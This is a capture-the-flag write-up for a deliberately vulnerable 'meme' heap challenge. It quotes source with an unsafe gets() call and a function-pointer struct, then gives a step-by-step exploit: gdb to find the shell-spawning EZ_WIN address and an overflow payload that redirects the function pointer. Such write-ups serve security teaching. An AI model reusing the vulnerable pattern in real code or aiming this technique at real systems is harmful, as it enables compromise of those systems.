## Overview

We are given a binary and a source code. Upon reading the source, one should notice some fishy parts, namely
```c++
void edit_meme(){
	unsigned int idx;
	printf("Index: ");
	idx = read_int();
	if(memes[idx] == NULL){
		puts("There's no meme there!");
		return;
	}
	printf("Enter meme content: ");
	gets(memes[idx]->content); //BIG MISTAKE
	puts("Done!");
}
```
that dreaded ```gets()``` function can be exploited, notice that:
```c++
void new_meme(){
	unsigned int size;
	printf("Enter meme size: ");
	size = read_int();
	if(size > 0x200){
		puts("Please, noone wants to read the entire bee movie script");
		exit(-1);
	}
	int i = 0;
	while(memes[i] != NULL && ++i < 8);
	if(i == 8){
		puts("No more memes for you!");
		exit(-1);
	}
	memes[i] = malloc(8);
	memes[i]->func = &my_print; //EXPLOITABLE
	memes[i]->content = malloc(size);
	printf("Enter meme content: ");
	fgets(memes[i]->content, size, stdin);
	puts("Done!");
}
```
```memes->func``` contains an pointer to a funtion... **any** function. Also notice that every ```memes``` object is only allocated 8 bytes of data
```c++
void EZ_WIN()	{
	puts("EAAAAAAAAAAAASYYYYYYYYYYYYY");
	system("/bin/sh");
	exit(0);
}
```
The ```EZ_WIN()``` function is probably the function we're after, its not referenced anywhere on the program
```c++
void print_meme()	{
	unsigned int idx;
	printf("Index: ");
	idx = read_int();
	if(memes[idx] == NULL)	{
		puts("There's no meme there!");
		return;
	}
	(*(memes[idx]->func))(memes[idx]->content);
}
```
We can use the ```print_meme()``` function to run it

## Solution

Using a linux terminal, create an executable and run it in gdb
```bash
$ chmod +x ez 
```
then
```bash
$ gdb ./ez
```
all you need is the address of the ```EZ_WIN()``` function to overwrite
```bash
(gdb) info address EZ_WIN
Symbol "EZ_WIN" is at 0x4014a0 in a file compiled without debugging
```
Perfect! now connect to the remote program and create two new memes object, then edit the first one so that it overflows to rewrite the function used in the second one (i.e. "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x14\x40"), print the second one, then use ```cat flag.txt``` to get the flag.
##### Solved by Cheesewaffle
